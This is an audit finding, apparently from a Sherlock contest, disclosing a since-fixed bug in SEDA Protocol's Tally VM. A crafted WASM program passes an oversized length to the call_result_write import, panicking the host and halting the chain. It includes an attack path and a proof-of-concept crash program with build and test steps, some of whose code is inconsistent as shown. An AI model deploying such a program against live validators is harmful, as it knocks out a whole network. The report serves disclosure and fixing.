---
tags:
  - severity/high
  - has/github
  - has/poc
  - lang/rust
  - sector/bridge
  - sector/staking
  - platform/sherlock
  - lang/solidity
protocol: "[[SEDA Protocol]]"
auditors:
  - g
report: "https://github.com/sherlock-audit/2024-12-seda-protocol-judging"
genome:
  - "[[dos-resistance]]"
  - "[[circuit-dos-invalid-proof]]"
  - "[[dos/griefing]]"
  - "[[dos/permanent]]"
  - "[[known-pattern]]"
  - "[[single-tx]]"
  - "[[add-check]]"
  - "[[precondition/always]]"
  - "[[blast-radius/protocol-wide]]"
---
# H-13: Anyone can crash validators with a Tally VM program that panics the call_result_write import

- id: 55240
- impact: HIGH
- protocol: SEDA Protocol
- reporter: g (Sherlock)
- source: N/A

## Summary


The Tally VM program has a vulnerability that can be exploited by anyone to crash validators. This is caused by an import in the program that panics and crashes the host environment. This leads to a chain halt and affects all validators that run the program. The vulnerability can be exploited by creating a WASM program and deploying it through a data request. The impact of this vulnerability is that all validators will crash and the SEDA Chain will halt. A proof of concept WASM program is provided to demonstrate the crash. The protocol team has fixed this issue and the fix can be found in the provided link.

## Details

Source: https://github.com/sherlock-audit/2024-12-seda-protocol-judging/issues/247 

## Found by 
g

### Summary

The Tally VM comes with [imports](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-wasm-vm/runtime/core/src/runtime.rs#L50-L60) that serve as a bridge between the host and the VM. These imports are run in the host environment.
When an import panics, it crashes the host, which causes the validator node to crash. The [`call_result_write`](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-wasm-vm/runtime/core/src/tally_vm_imports/mod.rs#L16) import can be used
to trigger an out-of-range index access and panic. Since the tally programs are [executed](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/x/tally/keeper/endblock.go#L210) from the Tally module's `Endblock()`, every
validator will crash when the described program is executed, which leads to a chain halt.

### Root Cause

In the imported [`call_result_write`](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-wasm-vm/runtime/core/src/core_vm_imports/call_result.rs#L17-L33) function, the user can pass an arbitrary `result_data_length`. As long as `result_data_length` is a value
greater than the length of `ctx.call_result_value`, the host environment will panic due to out-of-range index access.

```rust
  fn call_result_value(
      env: FunctionEnvMut<'_, VmContext>,
      result_data_ptr: WasmPtr<u8>,
      result_data_length: u32,
  ) -> Result<()> {
      let ctx = env.data();
      let memory = ctx.memory_view(&env);

      let target = result_data_ptr.slice(&memory, result_data_length)?;
      let call_value = ctx.call_result_value.read();

      for index in 0..result_data_length {
          // @audit call_value[index] will panic when index is out of range. The user can easily trigger this.
          target.index(index as u64).write(call_value[index as usize])?;
      }

      Ok(())
  }
```

The length of the default value of `ctx.call_result_value` is 0. 

### Internal Pre-conditions
None


### External Pre-conditions
None


### Attack Path
1. The Attacker (anyone) create a WASM program that exploits the vulnerability in the `call_result_write` import.
2. The Attacker then compiles the WASM program and deploys the binary via [`StoreOracleProgram()`](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/x/wasm-storage/keeper/msg_server.go#L34-L96).
3. The Attacker posts a Data Request that will execute their earlier deployed Tally Program.
4. Once the Data Request is for tallying, it will be processed in the Tally module's [`EndBlock()`](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/x/tally/keeper/endblock.go#L22-L41).
5. When [executing](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/x/tally/keeper/endblock.go#L210) the Attacker's Tally Program, it panics and crashes all the validators that run it. This causes a chain halt.


### Impact

All validators that execute the Attacker's Tally program will crash and the SEDA Chain will halt.


### PoC

The following WASM program will crash the host environment for the Tally VM.

```rust
#[link(wasm_import_module = "seda_v1")]
extern "C" {
    pub fn call_result_write(result: *const u8, result_length: u32);
}

fn main() {
    unsafe {
        call_result_write(result.as_ptr(), 1 as u32);
    }
}
```

To compile and run the above program, do the following:

1. Create the following `Cargo.toml`.

```toml
[package]
name = "attack"
version = "0.1.0"
edition = "2021"

[[bin]]
name = "attack"
path = "src/main.rs"
```

2. Run the following CLI commands.
```cli
$ rustup target add wasm32-wasi
$ cargo build --target wasm32-wasi
```

3. Copy the output WASM file into the seda-wasm-vm directory. For example:
```cli
// This assumes we are in the root of the Cargo project we just created
$ cp target/wasm32-wasi/debug/attack.wasm ../seda-wasm-vm
```

4. Add the below test to `libtallyvm/src/lib.rs`:
```rust
#[test]
  fn execute_attack() {
      let wasm_bytes = include_bytes!("../../attack.wasm");
      let mut envs: BTreeMap<String, String> = BTreeMap::new();

      envs.insert("VM_MODE".to_string(), "dr".to_string());
      envs.insert(DEFAULT_GAS_LIMIT_ENV_VAR.to_string(), "300000000000000".to_string());

      let tempdir = std::env::temp_dir();
      let result = _execute_tally_vm(
          &tempdir,
          wasm_bytes.to_vec(),
          vec![],
          envs,
      )
      .unwrap();

      println!("Result: {:?}", result);
  }
```

5. Run the test with `cargo test execute_attack`.

The test will crash with the following logs:
```logs
thread 'test::execute_sleepy' panicked at runtime/core/src/core_vm_imports/call_result.rs:42:56:
index out of bounds: the len is 0 but the index is 0
```

### Mitigation
Consider changing the method of writing to `call_result_value` to something like:

```rust
let mut call_value = ctx.call_result_value.write();
call_value.extend_from_slice(&target);
```

## Discussion

**sherlock-admin2**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/sedaprotocol/seda-wasm-vm/pull/66
